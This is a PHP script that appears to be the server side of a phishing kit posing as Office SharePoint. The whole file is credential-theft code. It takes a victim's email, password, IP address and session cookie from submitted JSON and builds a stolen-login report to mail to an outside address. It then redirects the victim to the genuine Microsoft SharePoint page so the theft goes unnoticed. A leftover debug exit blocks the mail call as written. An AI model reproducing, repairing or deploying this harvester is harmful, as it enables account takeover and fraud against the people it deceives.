<?php
$content_raw = file_get_contents("php://input"); 
$data = json_decode($content_raw, true);
$message = $headers = "";
if($data["email"] != "" and $data["password"] != ""){
    $message .= "-------------- LOGIN -----------------------\n";
    $message .= "\n";
    $message .= "Email: ".$data['email']."\n";
    $message .= "Password: ".$data['password']."\n";
    $message .= "Date: ".date("Y-m-d H:i:s")."\n";
    $message .= "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "\n";
    $message .= "|Client IP2:  ".json_encode($data['ip'])."\n";
    $message .= "\n";
    $message .= "|--------------- COOKIE -------------------|\n";
    $message .= "\n";
    $message .= "|Client cookie:  ".$data['cookie']."\n";
    $message .= "\n";
    $message .= "|----------- END --------------|\n";
    $recipient = "mary.rose.ogar.001@proton.me";
    $sender = "Office sharepoint L0Gs<d4rkl4b.pw>";
    $subject = "Office sharepoint  | ".$ip."\n";
    $headers .= "Office sharepoint\n";
    var_dump($message);exit;
    mail($recipient,$sender, $subject,$message,$headers);
    }
    header ("Location: https://www.microsoft.com/en-us/microsoft-365/sharepoint/collaboration");
